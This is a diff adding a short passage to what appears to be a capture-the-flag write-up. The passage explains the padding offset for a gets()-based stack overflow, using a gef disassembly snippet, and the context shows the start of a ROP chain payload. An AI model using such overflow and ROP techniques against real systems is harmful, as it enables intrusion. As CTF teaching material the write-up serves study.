@@ -141,6 +141,14 @@ As mentioned above, our payload must contain the string "QUIT" to break out of t
 string = b"QUIT"
 ```
 
+The padding will be 132 'A's as the offset from the buffer to %rbp is 0x80:
+```bash
+gef➤  x/3i 0x401229
+   0x401229:    lea    rax,[rbp-0x80]
+   0x40122d:    mov    rdi,rax
+   0x401230:    call   0x401060 <gets@plt>
+```
+
 ### 1st ropchain:
 ```python
 ropchain1 = b'A' * 0x84 + string
